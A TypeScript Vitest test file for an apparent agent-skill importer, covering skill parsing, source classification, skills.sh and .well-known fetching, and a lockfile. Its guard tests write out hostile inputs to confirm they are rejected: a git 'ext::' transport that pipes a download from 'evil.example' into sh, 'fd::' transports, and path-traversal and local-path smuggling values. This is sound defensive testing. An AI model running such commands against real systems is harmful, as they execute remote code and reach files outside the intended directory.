import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
import { SkillPreviewSchema } from '../schema.ts';
import { fetchSource, parseSkillsShSource, parseSource, SkillFetchError } from './fetch.ts';
import {
  emptySkillsLock,
  findByContentHash,
  parseSkillsLock,
  SkillsLockSchema,
  upsertLockEntry,
} from './lockfile.ts';
import { discoverSkillDirs, parseSkillDir } from './parse.ts';
import { resolveSkillsShImportSource } from './skills-sh.ts';
import { discoverWellKnownSkills } from './well-known.ts';

function writeSkill(dir: string, fm: string, body = 'Body.'): void {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'SKILL.md'), `---\n${fm}\n---\n\n${body}\n`, 'utf-8');
}

let root: string;

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), 'ok-acquire-'));
});
afterAll(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('parseSkillDir', () => {
  test('captures the FULL directory (not just scripts/+references/) + stable hash', () => {
    const dir = join(root, 'one');
    writeSkill(dir, 'name: cool-skill\ndescription: Does cool things');
    mkdirSync(join(dir, 'scripts'), { recursive: true });
    writeFileSync(join(dir, 'scripts', 'run.sh'), 'echo hi\n', 'utf-8');
    mkdirSync(join(dir, 'references'), { recursive: true });
    writeFileSync(join(dir, 'references', 'api.md'), '# API\n', 'utf-8');
    writeFileSync(join(dir, 'config.json'), '{"a":1}\n', 'utf-8');
    mkdirSync(join(dir, 'assets'), { recursive: true });
    writeFileSync(join(dir, 'assets', 'note.txt'), 'hi\n', 'utf-8');
    mkdirSync(join(dir, '.claude-plugin'), { recursive: true });
    writeFileSync(join(dir, '.claude-plugin', 'plugin.json'), '{}\n', 'utf-8');

    const skill = parseSkillDir(dir);
    expect(skill?.name).toBe('cool-skill');
    expect(skill?.description).toBe('Does cool things');
    expect(skill?.files.map((f) => f.relPath)).toEqual([
      '.claude-plugin/plugin.json',
      'assets/note.txt',
      'config.json',
      'references/api.md',
      'scripts/run.sh',
    ]);
    expect(skill?.files.find((f) => f.relPath === 'scripts/run.sh')?.content).toBe('echo hi\n');
    expect(skill?.contentHash).toMatch(/^[0-9a-f]{64}$/);
  });

  test('binary files are preserved as raw bytes (not UTF-8 mangled)', () => {
    const dir = join(root, 'bin');
    writeSkill(dir, 'name: b\ndescription: d');
    mkdirSync(join(dir, 'assets'), { recursive: true });
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0xff, 0xfe]);
    writeFileSync(join(dir, 'assets', 'logo.png'), png);

    const file = parseSkillDir(dir)?.files.find((f) => f.relPath === 'assets/logo.png');
    expect(file?.content).toBeNull();
    expect(file?.bytes && Array.from(file.bytes)).toEqual(Array.from(png));
  });

  test('parsed files map cleanly onto the preview response schema (regression)', () => {
    const dir = join(root, 'preview-shape');
    writeSkill(dir, 'name: p\ndescription: d');
    mkdirSync(join(dir, 'references'), { recursive: true });
    writeFileSync(join(dir, 'references', 'a.md'), '# A\n', 'utf-8');
    mkdirSync(join(dir, 'assets'), { recursive: true });
    writeFileSync(join(dir, 'assets', 'logo.png'), new Uint8Array([0x89, 0x00, 0xff]));
    const parsed = parseSkillDir(dir);
    const body = {
      name: parsed?.name ?? '',
      description: parsed?.description ?? '',
      skillMd: parsed?.skillMd ?? '',
      files: (parsed?.files ?? []).map((f) => ({ relPath: f.relPath, content: f.content })),
    };
    expect(SkillPreviewSchema.safeParse(body).success).toBe(true);
  });

  test('.git and node_modules are excluded from capture', () => {
    const dir = join(root, 'noisy');
    writeSkill(dir, 'name: n\ndescription: d');
    mkdirSync(join(dir, '.git'), { recursive: true });
    writeFileSync(join(dir, '.git', 'HEAD'), 'ref: x\n', 'utf-8');
    mkdirSync(join(dir, 'node_modules', 'p'), { recursive: true });
    writeFileSync(join(dir, 'node_modules', 'p', 'index.js'), 'x\n', 'utf-8');
    expect(parseSkillDir(dir)?.files).toEqual([]);
  });

  test('same bytes → same hash; changed bytes → different hash (dedupe key)', () => {
    const a = join(root, 'h-a');
    const b = join(root, 'h-b');
    const c = join(root, 'h-c');
    writeSkill(a, 'name: x\ndescription: d', 'Same.');
    writeSkill(b, 'name: x\ndescription: d', 'Same.');
    writeSkill(c, 'name: x\ndescription: d', 'Different.');
    expect(parseSkillDir(a)?.contentHash).toBe(parseSkillDir(b)?.contentHash as string);
    expect(parseSkillDir(a)?.contentHash).not.toBe(parseSkillDir(c)?.contentHash as string);
  });

  test('malformed frontmatter degrades to dir name; no SKILL.md → null', () => {
    const bad = join(root, 'degraded');
    writeSkill(bad, 'name: [unterminated\n : :');
    expect(parseSkillDir(bad)?.name).toBe('degraded');
    mkdirSync(join(root, 'empty'), { recursive: true });
    expect(parseSkillDir(join(root, 'empty'))).toBeNull();
  });
});

describe('discoverSkillDirs', () => {
  test('root-is-skill, skills/* layout, and multi', () => {
    const single = join(root, 'single');
    writeSkill(single, 'name: s\ndescription: d');
    expect(discoverSkillDirs(single).map((s) => s.name)).toEqual(['single']);

    const repo = join(root, 'repo');
    writeSkill(join(repo, 'skills', 'beta'), 'name: beta\ndescription: d');
    writeSkill(join(repo, 'skills', 'alpha'), 'name: alpha\ndescription: d');
    expect(discoverSkillDirs(repo).map((s) => s.name)).toEqual(['alpha', 'beta']);
  });

  test('nested category layout (skills/<category>/<skill>/) discovered recursively', () => {
    const repo = join(root, 'nested');
    writeSkill(join(repo, 'skills', 'productivity', 'grill-me'), 'name: grill-me\ndescription: d');
    writeSkill(join(repo, 'skills', 'engineering', 'tdd'), 'name: tdd\ndescription: d');
    mkdirSync(join(repo, 'skills', 'productivity', 'grill-me', 'scripts'), { recursive: true });
    writeSkill(
      join(repo, 'skills', 'productivity', 'grill-me', 'scripts', 'inner'),
      'name: inner\ndescription: d',
    );
    expect(discoverSkillDirs(repo).map((s) => s.name)).toEqual(['grill-me', 'tdd']);
  });
});

describe('parseSource', () => {
  test('classifies github shorthand, git url, local, file://, and null', () => {
    expect(parseSource('owner/repo')).toEqual({
      kind: 'git',
      url: 'https://github.com/owner/repo.git',
      subpath: undefined,
    });
    expect(parseSource('github owner/repo/skills/x')).toEqual({
      kind: 'git',
      url: 'https://github.com/owner/repo.git',
      subpath: 'skills/x',
    });
    expect(parseSource('https://gitlab.com/o/r.git')).toEqual({
      kind: 'git',
      url: 'https://gitlab.com/o/r.git',
    });
    expect(parseSource('./local/skill')).toEqual({ kind: 'local', path: './local/skill' });
    expect(parseSource('file:///abs/skill')).toEqual({ kind: 'local', path: '/abs/skill' });
    expect(parseSource('   ')).toBeNull();
  });

  test('rejects command-executing git transports (ext:: RCE guard)', () => {
    expect(parseSource("ext::sh -c 'curl evil.example/p|sh' x://y")).toBeNull();
    expect(parseSource('ext::curl evil.example')).toBeNull();
    expect(parseSource('fd::17/foo')).toBeNull();
    expect(parseSource('ssh://git@host/o/r.git')).toEqual({
      kind: 'git',
      url: 'ssh://git@host/o/r.git',
    });
    expect(parseSource('git@github.com:o/r.git')).toEqual({
      kind: 'git',
      url: 'git@github.com:o/r.git',
    });
    expect(parseSource('git://host/o/r.git')).toEqual({
      kind: 'git',
      url: 'git://host/o/r.git',
    });
    expect(parseSource('http://host/o/r.git')).toEqual({
      kind: 'git',
      url: 'http://host/o/r.git',
    });
    expect(parseSource('ftp://host/o/r.git')).toBeNull();
    expect(parseSource('svn://host/o/r')).toBeNull();
  });
});

describe('parseSkillsShSource', () => {
  test('parses explicit skills.sh URLs and handles without stealing github shorthand', () => {
    expect(parseSkillsShSource('https://www.skills.sh/acme/skills/review-bot')).toEqual({
      owner: 'acme',
      skill: 'review-bot',
    });
    expect(parseSkillsShSource('skills.sh/acme/skills/review-bot')).toEqual({
      owner: 'acme',
      skill: 'review-bot',
    });
    expect(parseSkillsShSource('skills.sh acme/review-bot')).toEqual({
      owner: 'acme',
      skill: 'review-bot',
    });
    expect(
      parseSkillsShSource('https://www.skills.sh/site/open.feishu.cn/lark-attendance'),
    ).toEqual({
      owner: 'open.feishu.cn',
      skill: 'lark-attendance',
    });
    expect(parseSkillsShSource('acme/review-bot')).toBeNull();
  });
});

describe('resolveSkillsShImportSource', () => {
  test('resolves a skills.sh URL to the GitHub source and selected skill', async () => {
    const calls: string[] = [];
    const fetchImpl = async (url: string) => {
      calls.push(url);
      return {
        ok: true,
        status: 200,
        json: async () => ({
          skills: [
            {
              id: 'acme/craft-kit/review-bot',
              name: 'review-bot',
              source: 'acme/craft-kit',
              installs: 42,
            },
          ],
        }),
      };
    };

    await expect(
      resolveSkillsShImportSource('https://www.skills.sh/acme/skills/review-bot', undefined, {
        fetchImpl,
      }),
    ).resolves.toEqual({
      source: 'acme/craft-kit',
      skill: 'review-bot',
      publisher: 'acme',
      spec: {
        kind: 'git',
        url: 'https://github.com/acme/craft-kit.git',
        subpath: undefined,
      },
    });
    expect(calls[0]).toContain('/api/search?q=review-bot&limit=30');
  });

  test('resolves a website catalog source without treating it as a git repository', async () => {
    const noLookup: typeof fetch = async () => {
      throw new Error('website catalog sources do not need a skills.sh search');
    };
    await expect(
      resolveSkillsShImportSource('open.feishu.cn', 'lark-attendance', {
        fetchImpl: noLookup,
      }),
    ).resolves.toEqual({
      source: 'open.feishu.cn',
      skill: 'lark-attendance',
      publisher: 'open.feishu.cn',
      spec: {
        kind: 'well-known',
        origin: 'https://open.feishu.cn',
        skill: 'lark-attendance',
      },
    });
  });

  test('rejects a resolved local source (local-path smuggle)', async () => {
    const fetchImpl = async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        skills: [{ id: '~/x/review-bot', name: 'review-bot', source: '~/x', installs: 1 }],
      }),
    });
    await expect(
      resolveSkillsShImportSource('skills.sh/~/skills/review-bot', undefined, { fetchImpl }),
    ).rejects.toThrow(/unsafe source/);
  });

  test('returns null for non-skills.sh sources and errors on unresolved handles', async () => {
    await expect(resolveSkillsShImportSource('owner/repo')).resolves.toBeNull();
    await expect(
      resolveSkillsShImportSource('skills.sh/acme/skills/missing', undefined, {
        fetchImpl: async () => ({
          ok: true,
          status: 200,
          json: async () => ({ skills: [] }),
        }),
      }),
    ).rejects.toThrow(SkillFetchError);
  });

  test('wraps network/timeout/JSON failures as SkillFetchError (400, not 500)', async () => {
    const boom = async () => {
      throw new TypeError('fetch failed');
    };
    await expect(
      resolveSkillsShImportSource('skills.sh/acme/skills/review-bot', undefined, {
        fetchImpl: boom,
      }),
    ).rejects.toThrow(SkillFetchError);
  });
});

describe('fetchSource', () => {
  test('materializes every file declared by a website-backed skill index', async () => {
    const origin = 'https://open.feishu.cn';
    const skillMd = '---\nname: lark-approval\ndescription: Approval tools\n---\n\nUse the API.\n';
    const reference = '# Approve\n';
    const logo = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff]);
    const responses = new Map<string, Response>([
      [`${origin}/.well-known/agent-skills/index.json`, new Response('<!doctype html>')],
      [
        `${origin}/.well-known/skills/index.json`,
        Response.json({
          skills: [
            {
              name: 'lark-approval',
              description: 'Approval tools',
              files: ['SKILL.md', 'references/approve.md', 'assets/logo.png'],
            },
          ],
        }),
      ],
      [`${origin}/.well-known/skills/lark-approval/SKILL.md`, new Response(skillMd)],
      [`${origin}/.well-known/skills/lark-approval/references/approve.md`, new Response(reference)],
      [
        `${origin}/.well-known/skills/lark-approval/assets/logo.png`,
        new Response(logo, { headers: { 'content-type': 'image/png' } }),
      ],
    ]);
    const requested: string[] = [];
    const fetchImpl: typeof fetch = async (input) => {
      const url = String(input);
      requested.push(url);
      return responses.get(url) ?? new Response('not found', { status: 404 });
    };

    const fetched = await fetchSource(
      { kind: 'well-known', origin, skill: 'lark-approval' },
      { fetchImpl },
    );
    try {
      const parsed = parseSkillDir(fetched.dir);
      expect(parsed?.skillMd).toBe(skillMd);
      expect(parsed?.files.map((file) => file.relPath)).toEqual([
        'assets/logo.png',
        'references/approve.md',
      ]);
      expect(parsed?.files.find((file) => file.relPath === 'references/approve.md')?.content).toBe(
        reference,
      );
      expect(parsed?.files.find((file) => file.relPath === 'assets/logo.png')?.bytes).toStrictEqual(
        logo,
      );
      expect(requested).toEqual([...responses.keys()]);
    } finally {
      fetched.cleanup();
    }
  });

  test('downloads a website bundle concurrently and reuses a supplied index', async () => {
    const origin = 'https://skills.example.com';
    const files = ['SKILL.md', 'references/a.md', 'references/b.md', 'references/c.md'];
    const index = {
      basePath: '/.well-known/skills',
      skills: [{ name: 'alpha', description: 'Alpha', files }],
    };
    let inFlight = 0;
    let peakInFlight = 0;
    const release: Array<() => void> = [];
    const requested: string[] = [];
    const fetchImpl: typeof fetch = async (input) => {
      const url = String(input);
      requested.push(url);
      inFlight += 1;
      peakInFlight = Math.max(peakInFlight, inFlight);
      await new Promise<void>((resolve) => {
        release.push(resolve);
        if (release.length === files.length) for (const r of release) r();
      });
      inFlight -= 1;
      return new Response(url.endsWith('SKILL.md') ? '---\nname: alpha\n---\n\nBody.\n' : 'ref');
    };

    const fetched = await fetchSource(
      { kind: 'well-known', origin, skill: 'alpha' },
      { fetchImpl, index },
    );
    try {
      expect(peakInFlight).toBe(files.length);
      expect(requested.some((url) => url.includes('index.json'))).toBe(false);
      expect(requested).toHaveLength(files.length);
    } finally {
      fetched.cleanup();
    }
  });

  test('discovers website-backed skills from the index without downloading bundles', async () => {
    const origin = 'https://skills.example.com';
    const requested: string[] = [];
    const fetchImpl: typeof fetch = async (input) => {
      const url = String(input);
      requested.push(url);
      return url.endsWith('/.well-known/agent-skills/index.json')
        ? new Response('not found', { status: 404 })
        : Response.json({
            skills: [
              { name: 'alpha', description: 'Alpha skill', files: ['SKILL.md'] },
              {
                name: 'beta',
                description: 'Beta skill',
                files: ['SKILL.md', 'references/api.md'],
              },
            ],
          });
    };

    await expect(discoverWellKnownSkills(origin, { fetchImpl })).resolves.toEqual([
      { name: 'alpha', description: 'Alpha skill' },
      { name: 'beta', description: 'Beta skill' },
    ]);
    expect(requested).toEqual([
      `${origin}/.well-known/agent-skills/index.json`,
      `${origin}/.well-known/skills/index.json`,
    ]);
  });

  test('rejects unsafe website bundle paths before requesting any files', async () => {
    const origin = 'https://skills.example.com';
    const requested: string[] = [];
    const fetchImpl: typeof fetch = async (input) => {
      const url = String(input);
      requested.push(url);
      return Response.json({
        skills: [
          {
            name: 'escape',
            description: 'Unsafe bundle',
            files: ['SKILL.md', '../outside.txt'],
          },
        ],
      });
    };

    await expect(
      fetchSource({ kind: 'well-known', origin, skill: 'escape' }, { fetchImpl }),
    ).rejects.toThrow(/No usable website skill index/);
    expect(requested).toEqual([
      `${origin}/.well-known/agent-skills/index.json`,
      `${origin}/.well-known/skills/index.json`,
    ]);
  });

  test('fails the whole website bundle when any declared dependency is unavailable', async () => {
    const origin = 'https://skills.example.com';
    const fetchImpl: typeof fetch = async (input) => {
      const url = String(input);
      if (url.endsWith('/index.json')) {
        return Response.json({
          skills: [
            {
              name: 'incomplete',
              description: 'Incomplete bundle',
              files: ['SKILL.md', 'references/missing.md'],
            },
          ],
        });
      }
      if (url.endsWith('/SKILL.md')) return new Response('---\nname: incomplete\n---\n');
      return new Response('not found', { status: 404 });
    };

    await expect(
      fetchSource({ kind: 'well-known', origin, skill: 'incomplete' }, { fetchImpl }),
    ).rejects.toThrow(/HTTP 404.*references\/missing\.md/);
  });

  test('refuses git command-executing transports (ext:: / fd::)', async () => {
    await expect(fetchSource({ kind: 'git', url: "ext::sh -c 'id'" })).rejects.toThrow(
      SkillFetchError,
    );
    await expect(fetchSource({ kind: 'git', url: 'fd::7/x' })).rejects.toThrow(SkillFetchError);
  });

  test('local path is read in place (no-op cleanup)', async () => {
    const dir = join(root, 'single');
    const f = await fetchSource({ kind: 'local', path: dir });
    expect(f.dir).toBe(dir);
    f.cleanup();
    expect(parseSkillDir(f.dir)?.name).toBe('s');
  });

  test('missing local path throws SkillFetchError', async () => {
    await expect(fetchSource({ kind: 'local', path: join(root, 'nope') })).rejects.toThrow(
      SkillFetchError,
    );
  });

  test('git source clones a local repo (no network)', async () => {
    const repo = join(root, 'gitrepo');
    writeSkill(repo, 'name: cloned\ndescription: from git');
    const git = (args: string[]) =>
      execFileSync('git', args, {
        cwd: repo,
        stdio: 'pipe',
        env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' },
      });
    git(['init', '-q']);
    git(['config', 'user.email', 't@t.t']);
    git(['config', 'user.name', 't']);
    git(['add', '-A']);
    git(['commit', '-q', '-m', 'init']);

    const f = await fetchSource({ kind: 'git', url: repo });
    try {
      expect(parseSkillDir(f.dir)?.name).toBe('cloned');
    } finally {
      f.cleanup();
    }
  });

  test('git subpath escaping the clone or missing is rejected', async () => {
    const repo = join(root, 'gitrepo-sub');
    writeSkill(repo, 'name: base\ndescription: d');
    const git = (args: string[]) =>
      execFileSync('git', args, {
        cwd: repo,
        stdio: 'pipe',
        env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' },
      });
    git(['init', '-q']);
    git(['config', 'user.email', 't@t.t']);
    git(['config', 'user.name', 't']);
    git(['add', '-A']);
    git(['commit', '-q', '-m', 'init']);
    await expect(fetchSource({ kind: 'git', url: repo, subpath: '../../../etc' })).rejects.toThrow(
      /escapes the clone/,
    );
    await expect(
      fetchSource({ kind: 'git', url: repo, subpath: 'does-not-exist' }),
    ).rejects.toThrow(/subpath not found/);
  });
});

describe('lockfile', () => {
  test('empty, upsert, findByContentHash, parse round-trip', () => {
    let lock = emptySkillsLock();
    expect(lock).toEqual({ schema: 1, skills: {} });
    lock = upsertLockEntry(lock, 'cool-skill', {
      source: 'owner/repo',
      ref: 'abc123',
      contentHash: 'deadbeef',
      importedAt: '2026-06-29T00:00:00.000Z',
    });
    expect(findByContentHash(lock, 'deadbeef')).toBe('cool-skill');
    expect(findByContentHash(lock, 'nope')).toBeNull();
    const round = parseSkillsLock(JSON.stringify(lock));
    expect(round).toEqual(lock);
    expect(SkillsLockSchema.safeParse(lock).success).toBe(true);
  });

  test('corrupt JSON → null (fail-soft)', () => {
    expect(parseSkillsLock('{not json')).toBeNull();
  });
});
